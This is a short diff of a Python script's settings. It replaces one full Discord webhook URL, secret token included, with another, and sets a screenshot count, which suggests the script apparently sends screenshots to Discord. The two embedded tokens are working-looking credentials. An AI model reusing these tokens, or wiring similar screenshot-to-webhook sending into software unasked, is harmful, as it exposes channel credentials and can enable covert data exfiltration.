@@ -23,7 +23,7 @@ import requests
 from time import sleep
 
 # YOUR DISCORD WEBHOOK
-discord_webhook = "https://discord.com/api/webhooks/1349331654212325408/XNELQlQ8kphehfa0LI_sw5AMrQXRfHcbwWIMDa03MOhy0Ryp54pD3h8WtBCOBeQP3OMC"
+discord_webhook = "https://discord.com/api/webhooks/1384949100213964943/FydEhZX3LuhnEPANUIpZ0JvtZkk8CMJ9CPO4NVMGwvSIQOBorxaqOM9M6MVwywIFXeSx"
 
 # Screenshot Settings
 SCREENSHOTS = 10
